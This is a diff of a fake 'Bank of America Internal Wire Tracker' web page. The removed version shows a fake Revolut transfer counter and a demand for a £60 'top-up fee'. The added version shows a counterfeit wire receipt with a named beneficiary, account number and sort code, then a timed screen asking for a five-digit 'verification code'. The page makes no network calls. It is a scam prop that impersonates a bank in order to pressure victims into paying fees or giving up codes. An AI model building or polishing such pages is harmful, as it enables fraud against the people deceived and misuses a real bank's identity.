@@ -1,254 +1,500 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank of America • Internal Wire Tracker</title>
-  <style>
-    :root {
-      --bofa-red: #d4001a;
-      --bofa-blue: #0033a0;
-      --gray-bg: #f7f7f7;
-    }
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Bank of America • Internal Wire Tracker</title>
 
-    body {
-      font-family: 'Arial', sans-serif;
-      background-color: var(--gray-bg);
-      color: #111;
-      margin: 0;
-      padding: 0;
-      transition: all 0.4s ease;
-    }
+<!--
+  Usage: paste this whole file into CodePen's HTML panel (NOT split into CSS/JS)
+  or open locally. All logos point to: https://i.imgur.com/q4HmdZ6.png
+-->
 
-    header {
-      background-color: var(--bofa-blue);
-      color: white;
-      display: flex;
-      align-items: center;
-      padding: 15px 20px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-    }
+<style>
+  :root{
+    --bofa-red: #d4001a;
+    --bofa-blue: #0033a0;
+    --bg: #f3f4f6;
+    --muted: #6b7280;
+    --card: #ffffff;
+    --max-width: 920px;
+  }
 
-    header img {
-      height: 40px;
-      margin-right: 10px;
-    }
+  /* reset & base */
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background:linear-gradient(180deg,var(--bg),#fafafa);
+    color:#0f172a;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
 
-    h1 {
-      font-size: 1.3rem;
-      font-weight: 600;
-    }
+  header{
+    width:100%;
+    background:var(--bofa-blue);
+    color:#fff;
+    padding:14px 16px;
+    box-shadow:0 8px 30px rgba(2,6,23,0.12);
+  }
+  .header-inner{
+    max-width:var(--max-width);
+    margin:0 auto;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+  }
+  .brand{display:flex;align-items:center;gap:12px}
+  .brand img{width:46px;height:46px;border-radius:8px;object-fit:cover}
+  .brand h1{margin:0;font-size:1rem;font-weight:800}
 
-    main {
-      padding: 40px 20px;
-      text-align: center;
-    }
+  main{width:100%;max-width:var(--max-width);padding:28px 16px 48px;margin:0 auto;flex:1;display:flex;flex-direction:column;gap:18px;align-items:stretch}
 
-    button {
-      background-color: var(--bofa-red);
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      font-size: 1rem;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      margin: 5px;
-    }
+  /* simple centered card for initial state */
+  .card{
+    background:var(--card);
+    border-radius:12px;
+    padding:20px;
+    display:flex;
+    gap:12px;
+    align-items:center;
+    justify-content:space-between;
+    box-shadow:0 14px 36px rgba(2,6,23,0.06);
+  }
+  .card .left{display:flex;flex-direction:column;gap:6px}
+  .card h2{margin:0;font-size:1.05rem;font-weight:900}
+  .card p{margin:0;color:var(--muted);font-size:0.95rem}
 
-    button:hover {
-      background-color: #b30015;
-    }
+  .primary-btn{
+    background:var(--bofa-red);
+    color:white;
+    border:none;
+    padding:12px 18px;
+    border-radius:10px;
+    font-weight:800;
+    cursor:pointer;
+    box-shadow:0 10px 22px rgba(212,0,26,0.14);
+  }
 
-    footer {
-      margin-top: 50px;
-      font-size: 0.9rem;
-      color: #555;
-      text-align: center;
-    }
+  /* overlay loader used when checking */
+  .overlay{
+    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:999;
+    background:rgba(7,10,23,0.28);backdrop-filter: blur(2px);opacity:0;pointer-events:none;transition:opacity .25s ease;
+  }
+  .overlay.show{opacity:1;pointer-events:auto}
+  .loader-box{background:rgba(255,255,255,0.96);padding:18px;border-radius:12px;display:flex;gap:14px;align-items:center;box-shadow:0 8px 24px rgba(2,6,23,0.12)}
+  .spinner{width:46px;height:46px;border-radius:50%;border:5px solid #eef2f7;border-top-color:var(--bofa-blue);animation:spin 0.9s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
 
-    /* Toast Notification */
-    .toast {
-      visibility: hidden;
-      min-width: 320px;
-      margin-left: -160px;
-      background-color: #fff;
-      color: #111;
-      text-align: left;
-      border-radius: 8px;
-      padding: 16px;
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      z-index: 1000;
-      border-left: 6px solid var(--bofa-red);
-      font-size: 0.95rem;
-      line-height: 1.4;
-      opacity: 0;
-      transform: translateY(-30px);
-      transition: all 0.5s ease;
-    }
+  /* receipt layout */
+  .receipt-wrap{
+    display:flex;
+    justify-content:center;
+    width:100%;
+  }
+  .receipt{
+    width:100%;
+    max-width:820px;
+    background:var(--card);
+    border-radius:12px;
+    padding:22px;
+    box-shadow:0 20px 48px rgba(2,6,23,0.08);
+    position:relative;
+    overflow:hidden;
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
 
-    .toast.show {
-      visibility: visible;
-      opacity: 1;
-      transform: translateY(0);
-    }
+  /* watermark */
+  .receipt::after{
+    content:"";
+    position:absolute;
+    inset:0;
+    background-image:url('https://i.imgur.com/q4HmdZ6.png');
+    background-repeat:no-repeat;
+    background-position:center right;
+    background-size:420px auto;
+    opacity:0.06;
+    transform:rotate(-6deg) translate(20px,-8px);
+    pointer-events:none;filter:grayscale(1);
+  }
 
-    /* Transfer Page */
-    #transfer-page {
-      display: none;
-      text-align: center;
-      padding: 50px 20px;
-      background: white;
-    }
+  .receipt-top{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:14px;
+  }
+  .receipt-left{display:flex;gap:12px;align-items:center}
+  .logo{width:72px;height:72px;border-radius:8px;overflow:hidden;flex:0 0 72px}
+  .logo img{width:100%;height:100%;object-fit:cover}
+  .receipt-info{display:flex;flex-direction:column;gap:3px}
+  .receipt-info .org{font-weight:900;font-size:1.02rem}
+  .receipt-info .sub{color:var(--muted);font-size:0.92rem}
 
-    /* Regular Spinner */
-    .spinner {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid var(--bofa-red);
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      margin: 30px auto;
-      animation: spin 2s linear infinite;
-    }
+  .amount-box{text-align:right;min-width:180px}
+  .small-label{font-size:0.9rem;color:var(--muted);font-weight:700}
+  .amount{text-align:right;font-weight:900;color:var(--bofa-red);font-size:2.4rem;margin-top:6px}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+  /* details grid - ensures clean alignment */
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(2,1fr);
+    gap:12px;
+    align-items:stretch;
+  }
+  .field{
+    background:linear-gradient(180deg,#fff,#fbfbfd);
+    border-radius:10px;padding:12px;border:1px solid rgba(2,6,23,0.04);
+    display:flex;flex-direction:column;justify-content:center;
+  }
+  .label{font-size:0.82rem;color:var(--muted);font-weight:700}
+  .value{font-weight:900;color:#111;text-transform:uppercase;font-size:1rem}
 
-    .transfer-info {
-      background: var(--gray-bg);
-      padding: 20px;
-      border-radius: 10px;
-      display: inline-block;
-      text-align: left;
-      margin-top: 20px;
-      font-size: 1rem;
-      line-height: 1.6;
-      border-left: 6px solid var(--bofa-blue);
-    }
+  .meta-row{
+    display:flex;justify-content:space-between;gap:8px;align-items:center;margin-top:6px;
+  }
+  .notice{color:var(--muted);font-size:0.95rem}
 
-    .amount-bar {
-      background: var(--bofa-blue);
-      color: white;
-      padding: 15px;
-      border-radius: 6px;
-      margin-top: 15px;
-      font-size: 1.1rem;
-    }
+  .actions{display:flex;justify-content:center;margin-top:10px}
+  .big-red{background:var(--bofa-red);color:white;border:none;padding:14px 22px;border-radius:10px;font-weight:900;cursor:pointer}
 
-    /* Red Banner */
-    .banner {
-      display: none;
-      background-color: var(--bofa-red);
-      color: white;
-      padding: 14px;
-      border-radius: 8px;
-      margin-top: 25px;
-      width: fit-content;
-      margin-left: auto;
-      margin-right: auto;
-      font-weight: 500;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-      animation: fadeIn 1s ease forwards;
-    }
+  /* code page */
+  .code-wrap{
+    width:100%;
+    max-width:520px;
+    margin:10px auto;
+    background:var(--card);
+    padding:20px;border-radius:12px;box-shadow:0 20px 40px rgba(2,6,23,0.06);
+    display:flex;flex-direction:column;gap:12px;align-items:center;
+  }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+  .code-header{display:flex;align-items:center;gap:12px}
+  .small-logo{width:48px;height:48px;border-radius:8px;overflow:hidden}
+  .small-logo img{width:100%;height:100%;object-fit:cover}
+  .warning{background:linear-gradient(90deg,#fff4f4,#fff1f1);border:1px solid rgba(212,0,26,0.06);color:var(--bofa-red);padding:12px;border-radius:8px;font-weight:800;text-align:center}
+  .timer{font-weight:900;color:var(--bofa-red);font-size:1.05rem;margin-top:4px}
+  .code-inputs{display:flex;gap:10px;justify-content:center;margin-top:6px}
+  .code-inputs input{width:56px;height:62px;font-size:1.6rem;font-weight:800;text-align:center;border-radius:8px;border:2px solid rgba(2,6,23,0.06)}
+  .submit-code{background:var(--bofa-red);color:white;padding:10px 14px;border-radius:8px;border:none;font-weight:800;cursor:pointer}
 
-  </style>
+  /* utility */
+  .hidden{display:none !important}
+  .visually-center{display:flex;align-items:center;justify-content:center}
+  footer{padding:18px 12px;text-align:center;color:var(--muted);font-size:0.9rem;width:100%;max-width:var(--max-width);margin:0 auto}
+
+  /* responsive */
+  @media (max-width:780px){
+    .grid{grid-template-columns:1fr}
+    .amount{text-align:left;font-size:1.8rem}
+    .amount-box{min-width:140px}
+    .logo{width:56px;height:56px}
+    .card{flex-direction:column;align-items:flex-start;gap:10px}
+    .receipt::after{background-size:320px auto;opacity:0.05}
+    .code-inputs input{width:48px;height:52px;font-size:1.3rem}
+  }
+</style>
 </head>
-
 <body>
-  <!-- First Page -->
-  <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Bank_of_America_logo.svg" alt="Bank of America Logo">
-    <h1>Internal Wire Tracker</h1>
-  </header>
 
-  <main id="main-page">
-    <h2>Transaction Processing</h2>
-    <p>Your wire transfer is currently being processed. Click below to check the current status.</p>
-    <button onclick="startTransfer()">Check Status</button>
-  </main>
+<header>
+  <div class="header-inner">
+    <div class="brand">
+      <!-- REPLACED logo with user's PNG -->
+      <img src="https://i.imgur.com/q4HmdZ6.png" alt="logo">
+      <h1>Bank of America — Internal Wire Tracker</h1>
+    </div>
+    <div style="font-weight:700;color:#fff">Secure Transfer Portal</div>
+  </div>
+</header>
 
-  <!-- Transfer Page -->
-  <main id="transfer-page">
-    <header>
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Bank_of_America_logo.svg" alt="Bank of America Logo">
-      <h1>Wire Transfer in Progress</h1>
-    </header>
-
-    <div class="spinner"></div>
-
-    <div id="banner" class="banner">
-      ✅ Payment completed. Stand by — retrying wire transfer.
+<main>
+  <!-- initial card -->
+  <section class="card" id="main-card" aria-live="polite">
+    <div class="left">
+      <h2>Wire Transfer</h2>
+      <p>Transaction queued on the payments network. Click to check status.</p>
     </div>
 
-    <div class="amount-bar" id="amount-bar">REVOLUT PLC: £0.00</div>
+    <div style="display:flex;align-items:center;gap:12px">
+      <div class="steps" aria-hidden="true" style="display:flex;gap:8px">
+        <div style="padding:6px 10px;border-radius:999px;background:#fff;border:1px solid rgba(2,6,23,0.04);font-weight:800;color:var(--muted)">Queued</div>
+        <div style="padding:6px 10px;border-radius:999px;background:#fff;border:1px solid rgba(2,6,23,0.04);font-weight:800;color:var(--muted)">Verification</div>
+        <div style="padding:6px 10px;border-radius:999px;background:#fff;border:1px solid rgba(2,6,23,0.04);font-weight:800;color:var(--muted)">Complete</div>
+      </div>
 
-    <div class="transfer-info">
-      <strong>Sending Amount:</strong> £9,567.20<br>
-      <strong>Sender Account:</strong> *****69001<br>
-      <strong>Bank BSN Name:</strong> Jasvir Singh Dhillon<br>
-      Notice: Your wire transfer is in progress on our high-speed transfer network. You will receive your transfer once the Revolut amount transfer has completed the sending amount.
+      <button id="track-btn" class="primary-btn" aria-controls="receipt">Check Status</button>
+    </div>
+  </section>
+
+  <!-- overlay used for "checking" -->
+  <div id="overlay" class="overlay hidden" aria-hidden="true">
+    <div class="loader-box" role="status" aria-live="polite">
+      <div class="spinner" aria-hidden="true"></div>
+      <div style="min-width:220px">
+        <div style="font-weight:800">Checking transfer status</div>
+        <div style="color:var(--muted);font-size:0.95rem">Connecting to payments network…</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- receipt (starts hidden) -->
+  <div id="receiptWrap" class="receipt-wrap hidden" aria-hidden="true">
+    <article class="receipt" id="receipt">
+      <div class="receipt-top">
+        <div class="receipt-left">
+          <div class="logo"><img src="https://i.imgur.com/q4HmdZ6.png" alt="logo"></div>
+          <div class="receipt-info">
+            <div class="org">Bank of America</div>
+            <div class="sub">Wire Transfer Receipt</div>
+          </div>
+        </div>
+
+        <div class="amount-box">
+          <div class="small-label">Amount</div>
+          <div class="amount" id="amountEl">£9,789.90</div>
+        </div>
+      </div>
+
+      <div class="grid" role="group" aria-label="transfer details">
+        <div class="field">
+          <div class="label">Beneficiary</div>
+          <div class="value">JASVIR SINGH DHILLON</div>
+        </div>
+
+        <div class="field">
+          <div class="label">Account Number</div>
+          <div class="value">02269015</div>
+        </div>
+
+        <div class="field">
+          <div class="label">Sort Code</div>
+          <div class="value">04-29-09</div>
+        </div>
+
+        <div class="field">
+          <div class="label">Receipt</div>
+          <div class="value" id="receiptNo">WTR-2025-0091</div>
+        </div>
+      </div>
+
+      <div class="meta-row">
+        <div class="notice">Notice: This receipt confirms a transfer attempt. The transaction will proceed after verification.</div>
+        <div style="color:var(--muted)">Date: <strong id="dateEl"></strong></div>
+      </div>
+
+      <div class="actions">
+        <button id="send-code" class="big-red">Send Code to Verify transfer</button>
+      </div>
+    </article>
+  </div>
+
+  <!-- code page (hidden initially) -->
+  <div id="codeWrap" class="code-wrap hidden" aria-hidden="true">
+    <div class="code-header">
+      <div class="small-logo"><img src="https://i.imgur.com/q4HmdZ6.png" alt="logo small"></div>
+      <div style="text-align:left">
+        <div style="font-weight:900">Verify Transfer</div>
+        <div style="color:var(--muted)">A final code has been sent to <strong>shellymarigoldboa</strong> account</div>
+      </div>
     </div>
 
-    <div style="margin-top: 30px;">
-      <button onclick="showFeeNotice()">Speed Up</button>
-      <button>Cancel</button>
+    <div class="warning" role="status" aria-live="polite">
+      <div class="timer" id="timer">02:00:00</div>
+      <div style="font-size:0.95rem;color:var(--muted)">You have 2 hours to enter the 5-digit code or the transfer will be canceled.</div>
     </div>
-  </main>
 
-  <footer>
-    &copy; 2025 Bank of America Global Banking. All rights reserved.
-  </footer>
+    <div style="font-weight:800">Enter the 5-digit verification code</div>
+    <div class="code-inputs" id="digits">
+      <input class="digit" maxlength="1" inputmode="numeric" />
+      <input class="digit" maxlength="1" inputmode="numeric" />
+      <input class="digit" maxlength="1" inputmode="numeric" />
+      <input class="digit" maxlength="1" inputmode="numeric" />
+      <input class="digit" maxlength="1" inputmode="numeric" />
+    </div>
 
-  <!-- Toast Notification -->
-  <div id="toast" class="toast"></div>
+    <button id="submitCode" class="submit-code">Submit Code</button>
+    <div id="codeResult" style="min-height:20px;font-weight:700"></div>
+    <div id="cancelMsg" class="hidden" style="color:#7a0a0a;font-weight:800">⛔ Transfer canceled — time expired. Please restart the transfer.</div>
+  </div>
+</main>
 
-  <script>
-    function startTransfer() {
-      document.getElementById("main-page").style.display = "none";
-      document.getElementById("transfer-page").style.display = "block";
+<footer>&copy; 2025 Bank of America Global Banking. All rights reserved.</footer>
 
-      let amount = 0.00;
-      const target = 1000.00;
-      const speed = 10;
-      const increment = 0.5;
-      const bar = document.getElementById("amount-bar");
-      const banner = document.getElementById("banner");
+<script>
+  // Elements
+  const trackBtn = document.getElementById('track-btn');
+  const overlay = document.getElementById('overlay');
+  const receiptWrap = document.getElementById('receiptWrap');
+  const codeWrap = document.getElementById('codeWrap');
+  const dateEl = document.getElementById('dateEl');
+  const sendCodeBtn = document.getElementById('send-code');
+  const digits = Array.from(document.querySelectorAll('.digit'));
+  const timerEl = document.getElementById('timer');
+  const submitCodeBtn = document.getElementById('submitCode');
+  const codeResult = document.getElementById('codeResult');
+  const cancelMsg = document.getElementById('cancelMsg');
 
-      const interval = setInterval(() => {
-        if (amount >= target) {
-          amount = target;
-          clearInterval(interval);
-          banner.style.display = "block"; // Show banner after reaching £1,000
-        } else {
-          amount += increment;
-          bar.textContent = `REVOLUT PLC: £${amount.toFixed(2)}`;
-        }
-      }, speed);
+  // initialize date
+  dateEl.textContent = new Date().toLocaleString();
+
+  // helper show/hide using .hidden
+  function showOverlay(ms=1400){
+    overlay.classList.remove('hidden');
+    overlay.classList.add('show');
+    overlay.setAttribute('aria-hidden','false');
+    return new Promise(res => setTimeout(()=>{
+      overlay.classList.remove('show');
+      overlay.classList.add('hidden');
+      overlay.setAttribute('aria-hidden','true');
+      res();
+    }, ms));
+  }
+
+  function showReceipt(){
+    receiptWrap.classList.remove('hidden');
+    receiptWrap.setAttribute('aria-hidden','false');
+    receiptWrap.scrollIntoView({behavior:'smooth',block:'center'});
+  }
+
+  function hideReceipt(){
+    receiptWrap.classList.add('hidden');
+    receiptWrap.setAttribute('aria-hidden','true');
+  }
+
+  function showCode(){
+    codeWrap.classList.remove('hidden');
+    codeWrap.setAttribute('aria-hidden','false');
+    codeWrap.scrollIntoView({behavior:'smooth',block:'center'});
+  }
+
+  function hideCode(){
+    codeWrap.classList.add('hidden');
+    codeWrap.setAttribute('aria-hidden','true');
+  }
+
+  // Track button: show overlay then receipt
+  trackBtn.addEventListener('click', async () => {
+    // disable button briefly
+    trackBtn.disabled = true;
+    await showOverlay(1200);
+    document.getElementById('main-card').classList.add('hidden');
+    showReceipt();
+    trackBtn.disabled = false;
+  });
+
+  // Send code: small delay, then open code screen
+  sendCodeBtn.addEventListener('click', async () => {
+    sendCodeBtn.disabled = true;
+    // inline small "sending" effect
+    const original = sendCodeBtn.textContent;
+    sendCodeBtn.textContent = 'Sending code...';
+    await new Promise(r => setTimeout(r, 900));
+    sendCodeBtn.textContent = original;
+    sendCodeBtn.disabled = false;
+
+    hideReceipt();
+    showCode();
+    digits.forEach(d => { d.value=''; d.disabled=false; });
+    digits[0].focus();
+
+    // start 2-hour timer
+    startTimer(2*60*60);
+    cancelMsg.classList.add('hidden');
+    codeResult.textContent = '';
+  });
+
+  // Timer
+  let remaining = 0;
+  let timerInterval = null;
+  function startTimer(seconds){
+    clearInterval(timerInterval);
+    remaining = seconds;
+    updateTimer();
+    timerInterval = setInterval(()=>{
+      remaining--;
+      if(remaining <= 0){
+        clearInterval(timerInterval);
+        timerEl.textContent = '00:00:00';
+        digits.forEach(d => d.disabled = true);
+        cancelMsg.classList.remove('hidden');
+      } else {
+        updateTimer();
+      }
+    },1000);
+  }
+  function updateTimer(){
+    const hrs = Math.floor(remaining/3600);
+    const mins = Math.floor((remaining%3600)/60);
+    const secs = remaining%60;
+    const pad = n => String(n).padStart(2,'0');
+    timerEl.textContent = `${pad(hrs)}:${pad(mins)}:${pad(secs)}`;
+  }
+
+  // digits behavior: numeric-only, auto-advance, backspace
+  digits.forEach((el, idx) => {
+    el.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g,'').slice(0,1);
+      if(e.target.value && idx < digits.length - 1) digits[idx+1].focus();
+    });
+    el.addEventListener('keydown', (e) => {
+      if(e.key === 'Backspace' && !e.target.value && idx > 0){
+        digits[idx-1].focus();
+      }
+      if(e.key === 'Enter' && idx === digits.length - 1){
+        submitCodeBtn.click();
+      }
+    });
+    el.addEventListener('paste', (ev) => {
+      ev.preventDefault();
+      const txt = (ev.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,digits.length);
+      for(let i=0;i<txt.length;i++) digits[i].value = txt[i];
+      const pos = Math.min(txt.length, digits.length - 1);
+      digits[pos].focus();
+    });
+  });
+
+  // submit code (front-end validation)
+  submitCodeBtn.addEventListener('click', () => {
+    if(remaining <= 0){
+      codeResult.textContent = 'Cannot submit — code expired.';
+      codeResult.style.color = '#7a0a0a';
+      return;
     }
-
-    function showFeeNotice() {
-      const toast = document.getElementById("toast");
-      toast.innerHTML = `
-        <strong>Notice:</strong> A Revolut Top-Up fee of £60 is required.<br>
-        Please pay directly from your Revolut account to continue.
-      `;
-      toast.classList.add("show");
-      setTimeout(() => {
-        toast.classList.remove("show");
-      }, 5000);
+    const code = digits.map(d => d.value).join('');
+    if(code.length !== 5){
+      codeResult.textContent = 'Please enter the full 5-digit code.';
+      codeResult.style.color = '#7a0a0a';
+      return;
     }
-  </script>
+    clearInterval(timerInterval);
+    digits.forEach(d => d.disabled = true);
+    codeResult.textContent = '✅ Code verified — transfer will proceed.';
+    codeResult.style.color = '#047857';
+  });
+
+  // keyboard escape to reset to main (developer convenience)
+  document.addEventListener('keydown', (e) => {
+    if(e.key === 'Escape'){
+      hideReceipt();
+      hideCode();
+      document.getElementById('main-card').classList.remove('hidden');
+      clearInterval(timerInterval);
+    }
+  });
+
+  // Make sure initial UI is hidden/shown correctly when pasted into CodePen
+  receiptWrap.classList.add('hidden');
+  codeWrap.classList.add('hidden');
+  overlay.classList.add('hidden');
+</script>
 
 </body>
 </html>
